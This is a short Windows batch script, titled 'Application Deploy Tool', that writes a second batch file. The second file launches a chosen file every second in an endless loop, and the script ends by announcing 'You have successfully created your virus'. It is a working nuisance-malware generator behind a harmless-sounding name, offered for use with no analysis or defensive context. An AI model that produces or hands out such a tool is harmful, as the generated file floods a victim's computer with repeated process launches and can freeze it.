title APPLICATION DEPLOY TOOL
@echo off
color 0a
mode con:cols=90 lines=30
echo                             WELCOME TO APPLICATION DEPLOY TOOL 
echo Type File name to save in:
set /p src=
echo Type the file to deploy 
set /p fil=
echo :a >%src%.bat
echo start %fil%>>%src%.bat
echo timeout /t 1 /nobreak>>%src%.bat
echo goto :a>>%src%.bat
if exist %src%.bat  echo You have successfully created your virus
color
pause >nul